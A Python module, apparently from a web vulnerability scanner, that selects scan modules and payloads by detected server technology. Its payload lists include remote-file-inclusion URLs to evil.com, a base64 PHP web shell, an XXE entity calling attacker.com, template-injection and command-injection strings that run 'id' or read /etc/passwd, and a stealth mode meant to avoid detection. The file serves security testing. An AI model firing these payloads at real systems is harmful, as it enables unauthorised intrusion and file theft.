"""
Language-Based Scan Optimizer

Optimizes scanning based on detected programming language/framework:
- Selects relevant modules for detected technology
- Uses language-specific payloads
- Skips irrelevant checks (e.g., no JSP checks for PHP sites)
- Prioritizes high-value checks for each technology
"""

from typing import Dict, List, Set, Any, Optional
from dataclasses import dataclass
from enum import Enum
from core.logger import get_logger

logger = get_logger(__name__)


class TechCategory(Enum):
    """Technology categories"""
    PHP = "php"
    JAVA = "java"
    DOTNET = "dotnet"
    PYTHON = "python"
    NODEJS = "nodejs"
    RUBY = "ruby"
    GO = "go"
    PERL = "perl"
    COLDFUSION = "coldfusion"
    GENERIC = "generic"


@dataclass
class TechProfile:
    """Profile for a technology stack"""
    category: TechCategory
    name: str
    file_extensions: List[str]
    relevant_modules: List[str]
    priority_modules: List[str]  # Run these first
    skip_modules: List[str]  # Don't run these
    deserialization_type: Optional[str]
    specific_payloads: Dict[str, List[str]]  # module -> payloads


# Technology profiles with language-specific configurations
TECH_PROFILES: Dict[TechCategory, TechProfile] = {
    TechCategory.PHP: TechProfile(
        category=TechCategory.PHP,
        name="PHP",
        file_extensions=[".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".inc"],
        relevant_modules=[
            "sqli", "xss", "lfi", "rfi", "ssti", "command_injection",
            "php_object_injection", "file_upload", "xxe", "ssrf",
            "open_redirect", "idor", "env_secrets", "backup_files",
            "path_traversal", "deserialization", "wordpress_scanner"
        ],
        priority_modules=["sqli", "lfi", "rfi", "php_object_injection", "command_injection"],
        skip_modules=["jsp_injection", "viewstate", "dotnet_deserialization", "spring_actuator"],
        deserialization_type="php",
        specific_payloads={
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "php://filter/convert.base64-encode/resource=",
                "php://input",
                "expect://id",
                "data://text/plain;base64,",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "/proc/self/environ",
            ],
            "rfi": [
                "http://evil.com/shell.txt",
                "https://evil.com/shell.txt",
                "//evil.com/shell.txt",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "{php}echo 'test';{/php}",
                "{system('id')}",
            ],
            "command_injection": [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                ";cat /etc/passwd",
                "| cat /etc/passwd",
            ],
            "backup_files": [
                ".php.bak", ".php~", ".php.old", ".php.save",
                ".php.swp", ".php.orig", "config.php.bak",
                "wp-config.php.bak", "settings.php.bak",
            ],
        }
    ),

    TechCategory.JAVA: TechProfile(
        category=TechCategory.JAVA,
        name="Java/J2EE",
        file_extensions=[".jsp", ".jspx", ".do", ".action", ".jsf", ".faces", ".seam"],
        relevant_modules=[
            "sqli", "xss", "xxe", "ssti", "deserialization", "ssrf",
            "command_injection", "path_traversal", "log4j", "spring_actuator",
            "struts_rce", "ognl_injection", "el_injection", "file_upload"
        ],
        priority_modules=["deserialization", "xxe", "log4j", "struts_rce", "ognl_injection"],
        skip_modules=["lfi", "rfi", "php_object_injection", "viewstate"],
        deserialization_type="java",
        specific_payloads={
            "ssti": [
                "${7*7}",
                "#{7*7}",
                "*{7*7}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            ],
            "command_injection": [
                "Runtime.getRuntime().exec()",
                "ProcessBuilder",
            ],
            "backup_files": [
                ".jsp.bak", ".war.bak", "web.xml.bak",
                "application.properties.bak", ".class.bak",
            ],
            "deserialization": [
                # Java serialization magic bytes
                "rO0AB",  # Base64 of AC ED 00 05
                "H4sIAAAA",  # GZIP compressed
            ],
        }
    ),

    TechCategory.DOTNET: TechProfile(
        category=TechCategory.DOTNET,
        name="ASP.NET",
        file_extensions=[".aspx", ".asmx", ".ashx", ".ascx", ".axd", ".cshtml", ".vbhtml"],
        relevant_modules=[
            "sqli", "xss", "xxe", "deserialization", "viewstate",
            "ssrf", "path_traversal", "command_injection", "file_upload",
            "dotnet_deserialization", "blazor_security"
        ],
        priority_modules=["viewstate", "deserialization", "dotnet_deserialization", "xxe"],
        skip_modules=["lfi", "rfi", "php_object_injection", "jsp_injection", "spring_actuator"],
        deserialization_type="dotnet",
        specific_payloads={
            "ssti": [
                "@(1+1)",
                "@System.Diagnostics.Process.Start(\"cmd\",\"/c id\")",
            ],
            "backup_files": [
                ".aspx.bak", ".config.bak", "web.config.bak",
                ".cs.bak", ".dll.bak", "appsettings.json.bak",
            ],
            "path_traversal": [
                "..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\....\\\\windows\\win.ini",
            ],
            "deserialization": [
                # .NET BinaryFormatter
                "AAEAAAD/////",
                # TypeConfuseDelegate
                "TypeConfuseDelegate",
            ],
        }
    ),

    TechCategory.PYTHON: TechProfile(
        category=TechCategory.PYTHON,
        name="Python",
        file_extensions=[".py", ".pyc", ".pyo"],
        relevant_modules=[
            "sqli", "xss", "ssti", "command_injection", "ssrf",
            "path_traversal", "deserialization", "xxe", "nosql_injection",
            "prototype_pollution", "file_upload", "env_secrets"
        ],
        priority_modules=["ssti", "command_injection", "deserialization", "nosql_injection"],
        skip_modules=["lfi", "rfi", "php_object_injection", "viewstate", "jsp_injection"],
        deserialization_type="python",
        specific_payloads={
            "ssti": [
                "{{7*7}}",
                "{{config}}",
                "{{config.items()}}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{%for c in ''.__class__.__mro__[1].__subclasses__()%}{{c}}{%endfor%}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            "command_injection": [
                ";import os;os.system('id')",
                "__import__('os').system('id')",
                "eval(compile('import os;os.system(\"id\")','','exec'))",
            ],
            "deserialization": [
                # Pickle magic bytes (base64)
                "gASV",
                "cos\nsystem",
                "cposix\nsystem",
            ],
            "backup_files": [
                ".py.bak", "settings.py.bak", "config.py.bak",
                "requirements.txt.bak", ".pyc.bak",
            ],
        }
    ),

    TechCategory.NODEJS: TechProfile(
        category=TechCategory.NODEJS,
        name="Node.js",
        file_extensions=[".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx"],
        relevant_modules=[
            "sqli", "xss", "ssti", "ssrf", "nosql_injection",
            "prototype_pollution", "command_injection", "path_traversal",
            "deserialization", "xxe", "file_upload", "env_secrets"
        ],
        priority_modules=["prototype_pollution", "nosql_injection", "ssti", "command_injection"],
        skip_modules=["lfi", "rfi", "php_object_injection", "viewstate", "jsp_injection"],
        deserialization_type="nodejs",
        specific_payloads={
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
            ],
            "nosql_injection": [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "this.password.match(/.*/)"}',
            ],
            "prototype_pollution": [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"__proto__": {"polluted": "yes"}}',
            ],
            "command_injection": [
                "$(id)",
                "`id`",
                "require('child_process').exec('id')",
            ],
            "backup_files": [
                "package.json.bak", ".env.bak", "config.js.bak",
                "server.js.bak", "app.js.bak",
            ],
        }
    ),

    TechCategory.RUBY: TechProfile(
        category=TechCategory.RUBY,
        name="Ruby/Rails",
        file_extensions=[".rb", ".erb", ".rhtml"],
        relevant_modules=[
            "sqli", "xss", "ssti", "command_injection", "ssrf",
            "deserialization", "path_traversal", "xxe", "file_upload",
            "mass_assignment", "env_secrets"
        ],
        priority_modules=["deserialization", "ssti", "command_injection", "mass_assignment"],
        skip_modules=["lfi", "rfi", "php_object_injection", "viewstate", "jsp_injection"],
        deserialization_type="ruby",
        specific_payloads={
            "ssti": [
                "<%= 7*7 %>",
                "<%= system('id') %>",
                "#{7*7}",
            ],
            "command_injection": [
                "`id`",
                "$(id)",
                "%x(id)",
                "system('id')",
                "exec('id')",
            ],
            "deserialization": [
                # Ruby Marshal
                "BAhv",
                # YAML deserialization
                "--- !ruby/object:Gem::Installer",
            ],
            "backup_files": [
                ".rb.bak", "database.yml.bak", "secrets.yml.bak",
                "Gemfile.bak", "config.ru.bak",
            ],
        }
    ),

    TechCategory.GO: TechProfile(
        category=TechCategory.GO,
        name="Go/Golang",
        file_extensions=[".go"],
        relevant_modules=[
            "sqli", "xss", "ssti", "ssrf", "command_injection",
            "path_traversal", "xxe", "file_upload", "env_secrets"
        ],
        priority_modules=["ssti", "command_injection", "ssrf"],
        skip_modules=["lfi", "rfi", "php_object_injection", "viewstate", "deserialization"],
        deserialization_type=None,
        specific_payloads={
            "ssti": [
                "{{.}}",
                "{{printf \"%s\" .}}",
            ],
            "command_injection": [
                ";id",
                "|id",
                "$(id)",
            ],
            "backup_files": [
                ".go.bak", "go.mod.bak", "go.sum.bak",
                "main.go.bak", "config.go.bak",
            ],
        }
    ),

    TechCategory.COLDFUSION: TechProfile(
        category=TechCategory.COLDFUSION,
        name="ColdFusion",
        file_extensions=[".cfm", ".cfc", ".cfml"],
        relevant_modules=[
            "sqli", "xss", "lfi", "path_traversal", "command_injection",
            "file_upload", "xxe", "deserialization"
        ],
        priority_modules=["lfi", "path_traversal", "deserialization"],
        skip_modules=["php_object_injection", "viewstate", "spring_actuator"],
        deserialization_type="java",  # ColdFusion runs on Java
        specific_payloads={
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "/opt/coldfusion/lib/password.properties",
            ],
            "backup_files": [
                ".cfm.bak", ".cfc.bak", "Application.cfc.bak",
            ],
        }
    ),

    TechCategory.PERL: TechProfile(
        category=TechCategory.PERL,
        name="Perl/CGI",
        file_extensions=[".pl", ".cgi", ".pm"],
        relevant_modules=[
            "sqli", "xss", "lfi", "command_injection", "path_traversal",
            "file_upload", "cgi_scanner"
        ],
        priority_modules=["command_injection", "lfi", "cgi_scanner"],
        skip_modules=["php_object_injection", "viewstate", "spring_actuator", "deserialization"],
        deserialization_type=None,
        specific_payloads={
            "command_injection": [
                "|id",
                ";id",
                "`id`",
                "| cat /etc/passwd",
            ],
            "lfi": [
                "../../../etc/passwd",
                "/etc/passwd",
            ],
            "backup_files": [
                ".pl.bak", ".cgi.bak", ".pm.bak",
            ],
        }
    ),

    TechCategory.GENERIC: TechProfile(
        category=TechCategory.GENERIC,
        name="Generic/Unknown",
        file_extensions=[],
        relevant_modules=[
            "sqli", "xss", "lfi", "command_injection", "path_traversal",
            "ssrf", "xxe", "open_redirect", "idor", "file_upload",
            "env_secrets", "backup_files", "sensitive_data"
        ],
        priority_modules=["sqli", "xss", "lfi", "command_injection"],
        skip_modules=[],
        deserialization_type=None,
        specific_payloads={}
    ),
}


class LanguageOptimizer:
    """Optimizes scanning based on detected technology"""

    def __init__(self):
        self.detected_tech: Set[TechCategory] = set()
        self.detected_details: List[Dict[str, Any]] = []

    def detect_from_technologies(self, technologies: List[Dict[str, Any]]) -> Set[TechCategory]:
        """
        Detect technology categories from passive technology detection results

        Args:
            technologies: List of detected technologies from TechnologyDetector

        Returns:
            Set of detected TechCategory values
        """
        self.detected_details = technologies
        detected = set()

        for tech in technologies:
            name = tech.get("name", "").lower()
            category = tech.get("category", "").lower()

            # PHP detection
            if "php" in name or "wordpress" in name or "drupal" in name or "joomla" in name:
                detected.add(TechCategory.PHP)

            # Java detection
            if any(j in name for j in ["java", "jsp", "tomcat", "jboss", "wildfly", "spring", "struts"]):
                detected.add(TechCategory.JAVA)

            # .NET detection
            if any(d in name for d in ["asp.net", ".net", "iis", "blazor"]):
                detected.add(TechCategory.DOTNET)

            # Python detection
            if any(p in name for p in ["python", "django", "flask", "fastapi", "tornado", "gunicorn"]):
                detected.add(TechCategory.PYTHON)

            # Node.js detection
            if any(n in name for n in ["node", "express", "next.js", "nuxt", "nest.js", "koa"]):
                detected.add(TechCategory.NODEJS)

            # Ruby detection
            if any(r in name for r in ["ruby", "rails", "sinatra", "puma", "unicorn"]):
                detected.add(TechCategory.RUBY)

            # Go detection
            if "go" in name or "golang" in name or "gin" in name or "echo" in name:
                detected.add(TechCategory.GO)

            # ColdFusion detection
            if "coldfusion" in name or "cfml" in name:
                detected.add(TechCategory.COLDFUSION)

            # Perl detection
            if "perl" in name or "cgi" in category:
                detected.add(TechCategory.PERL)

        self.detected_tech = detected

        if not detected:
            detected.add(TechCategory.GENERIC)
            logger.info("No specific technology detected, using generic profile")
        else:
            logger.info(f"Detected technologies: {[t.value for t in detected]}")

        return detected

    def detect_from_url(self, url: str) -> Set[TechCategory]:
        """
        Detect technology from URL file extension

        Args:
            url: URL to analyze

        Returns:
            Set of detected TechCategory values
        """
        detected = set()
        url_lower = url.lower()

        for tech_cat, profile in TECH_PROFILES.items():
            for ext in profile.file_extensions:
                if ext in url_lower:
                    detected.add(tech_cat)
                    break

        return detected

    def get_relevant_modules(self) -> List[str]:
        """
        Get list of modules relevant to detected technologies

        Returns:
            List of module names to run
        """
        if not self.detected_tech:
            return TECH_PROFILES[TechCategory.GENERIC].relevant_modules

        modules = set()
        for tech in self.detected_tech:
            profile = TECH_PROFILES.get(tech, TECH_PROFILES[TechCategory.GENERIC])
            modules.update(profile.relevant_modules)

        return list(modules)

    def get_priority_modules(self) -> List[str]:
        """
        Get list of high-priority modules for detected technologies

        Returns:
            List of priority module names (run these first)
        """
        if not self.detected_tech:
            return TECH_PROFILES[TechCategory.GENERIC].priority_modules

        priority = []
        for tech in self.detected_tech:
            profile = TECH_PROFILES.get(tech, TECH_PROFILES[TechCategory.GENERIC])
            for mod in profile.priority_modules:
                if mod not in priority:
                    priority.append(mod)

        return priority

    def get_skip_modules(self) -> Set[str]:
        """
        Get list of modules to skip for detected technologies

        Returns:
            Set of module names to skip
        """
        if not self.detected_tech:
            return set()

        # Only skip if ALL detected technologies agree to skip
        skip_sets = []
        for tech in self.detected_tech:
            profile = TECH_PROFILES.get(tech)
            if profile:
                skip_sets.append(set(profile.skip_modules))

        if not skip_sets:
            return set()

        # Intersection - only skip if all profiles agree
        return set.intersection(*skip_sets)

    def get_specific_payloads(self, module_name: str) -> List[str]:
        """
        Get technology-specific payloads for a module

        Args:
            module_name: Name of the module

        Returns:
            List of specific payloads or empty list
        """
        payloads = []

        for tech in self.detected_tech:
            profile = TECH_PROFILES.get(tech)
            if profile and module_name in profile.specific_payloads:
                payloads.extend(profile.specific_payloads[module_name])

        return list(set(payloads))  # Deduplicate

    def get_deserialization_types(self) -> List[str]:
        """
        Get relevant deserialization types for detected technologies

        Returns:
            List of deserialization types (php, java, python, etc.)
        """
        types = []
        for tech in self.detected_tech:
            profile = TECH_PROFILES.get(tech)
            if profile and profile.deserialization_type:
                types.append(profile.deserialization_type)

        return list(set(types))

    def should_scan_module(self, module_name: str) -> bool:
        """
        Check if a module should be scanned based on technology

        Args:
            module_name: Name of the module

        Returns:
            True if module should be scanned
        """
        skip = self.get_skip_modules()
        if module_name in skip:
            logger.debug(f"Skipping module {module_name} - not relevant for detected tech")
            return False

        return True

    def get_optimization_summary(self) -> Dict[str, Any]:
        """
        Get summary of optimizations being applied

        Returns:
            Dictionary with optimization details
        """
        return {
            "detected_technologies": [t.value for t in self.detected_tech],
            "relevant_modules": self.get_relevant_modules(),
            "priority_modules": self.get_priority_modules(),
            "skip_modules": list(self.get_skip_modules()),
            "deserialization_types": self.get_deserialization_types(),
        }


# Scan mode configurations
SCAN_MODES = {
    "quick": {
        "name": "Quick Scan",
        "payload_limit": 5,
        "max_depth": 2,
        "max_urls": 50,
        "threads": 10,
        "timeout": 5,
        "skip_slow_modules": True,
        "priority_only": True,  # Only run priority modules
        "description": "Fast initial assessment with minimal payloads"
    },
    "standard": {
        "name": "Standard Scan",
        "payload_limit": 20,
        "max_depth": 3,
        "max_urls": 200,
        "threads": 8,
        "timeout": 10,
        "skip_slow_modules": False,
        "priority_only": False,
        "description": "Balanced scan with good coverage"
    },
    "full": {
        "name": "Full Scan",
        "payload_limit": 0,  # No limit
        "max_depth": 5,
        "max_urls": 1000,
        "threads": 5,
        "timeout": 30,
        "skip_slow_modules": False,
        "priority_only": False,
        "description": "Comprehensive scan with all payloads"
    },
    "stealth": {
        "name": "Stealth Scan",
        "payload_limit": 3,
        "max_depth": 2,
        "max_urls": 30,
        "threads": 2,
        "timeout": 15,
        "skip_slow_modules": True,
        "priority_only": True,
        "request_delay": 2.0,  # Seconds between requests
        "description": "Low-profile scan to avoid detection"
    },
}

# Slow modules that take longer to run
SLOW_MODULES = [
    "race_condition",
    "business_logic",
    "api_rate_limit",
    "dirbrute",
    "subdomain_takeover",
]


def get_scan_mode_config(mode: str) -> Dict[str, Any]:
    """Get configuration for a scan mode"""
    return SCAN_MODES.get(mode, SCAN_MODES["standard"])
